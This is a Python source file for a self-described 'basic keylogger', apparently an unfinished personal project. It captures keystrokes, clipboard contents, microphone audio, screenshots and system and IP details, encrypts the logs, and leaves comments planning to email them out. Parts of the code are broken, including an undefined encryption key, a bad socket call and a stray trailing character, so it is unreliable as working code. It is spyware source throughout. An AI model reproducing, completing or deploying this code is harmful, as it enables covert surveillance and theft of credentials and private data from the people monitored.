#   basic keylogger


from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

import win32clipboard
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

system_info = "sysinfo.txt"
file_pth = "C:\\Users\\1kath\\PycharmProjects\\keylogger-v1\\project"
extend = "\\"  # make a merge here - fileppath + file extend
clipboard_info = "clipboard.txt"
keys_information = "log.txt"

# using pilow for the screen grab

# maybe rewrite this tbh
keys_information_e = "log_e.txt"
system_info_e = "sysinfo_e.txt"
clipboard_info_e = "clipboard_e.txt"

file_merge = file_pth + extend

def get_computer_info():
    with open(file_pth + extend + system_info, "a") as f:
        hostnme = socket.gethostname()
        IPAdd = socket.gethostbyaddr()
        try:
            public_IP = get("https://api.ipify.org").text
            f.write("public IP address" + public_IP)
        except Exception:
            f.write("IP Address could not be obtained. probably max query")

        f.write("processor: " + (platform.processor()) + '\n')
        f.write("system:" + platform.system() + " " + platform.version() + '\n')
        f.write("machine:" + platform.machine() + '\n')
        f.write('hostname:' + hostnme + '\n')
        f.write("private ip address:" + IPAdd + '\n')


get_computer_info()

microphone_time = 10  # this is in seconds
audio_info = "audio.wav"


def copy_clipboard():
    with open(file_pth + extend + clipboard_info, "a") as f:
        try:  # this only works if the clipboard is a string FIND A WAY TO GET SCREENSHOT CLIPBOARDS
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("clipboard data:" + "\n" + pasted_data)
        except:
            f.write("clipboard could not be copied")


copy_clipboard()


def get_microphone():
    fs = 44100  # sampling frequency, this is a common samplnig frequency
    timer = microphone_time  # wiill need to change this later to align with acutal timer

    recording = sd.rec(int(timer * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_pth + extend + audio_info, fs, recording)


get_microphone()

screenshot_info = "screenshot.png"


def screenshot():
    im = ImageGrab.grab()
    im.save(file_pth + extend + screenshot_info)


screenshot()

num_iterations = 0
time_iteration = 15  # each iteration = 15 seconds
currTime = time.time()
stopTime = time.time() + time_iteration
end_iterations = 3  # 3 iterations total

while num_iterations < end_iterations:

    count = 0
    keys = []


    def write_file(keys):
        with open(file_pth + extend + keys_information, "a") as f:  # so 'w' if the file does not exist, a if it does
            for key in keys:
                k = str(key).replace("'", "")  # replace '' with nothing
                if k.find("enter") > 0:  # replace 'enter' with a newline
                    f.write('\n')
                elif k.find("Key") == -1:  # if key is anything else write to file
                    f.write(k)
                    f.close()


    def on_press(key):
        global keys, count, currTime
        keys.append(key)
        count += 1
        currTime = time.time()
        print("{} pressed".format(key))

        if count >= 10:
            count = 0
            write_file(str(keys))
            keys = []


    def on_release(key):
        if key == Key.esc:
            return False

        if currTime > stopTime:  # if current time > stopping time exit keylogger
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currTime > stopTime:
        with open(file_pth + extend + keys_information, "w") as f:  # clear out logs NEED TO EMAIL BEFORE THIS
            f.write(" ")

        screenshot()
        # send email
files_tob_e = [file_merge + system_info,
               file_merge + clipboard_info,
               file_merge + keys_information]

e_file_names = [file_merge + system_info_e,
                file_merge + clipboard_info_e,
                file_merge + keys_information_e]

count = 0
for encrypting_file in files_tob_e:
    with open(files_tob_e[count], 'rb') as f:  # open up each file
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(e_file_names[count], 'wb') as f:
        f.write(encrypted)

    # then send email with    send_email(e_files_names[count], e_files_names[count], toaddr)
    count += 1

    time.sleep(120)  # each iteration to slepe for 2 emails for emails to be sent

r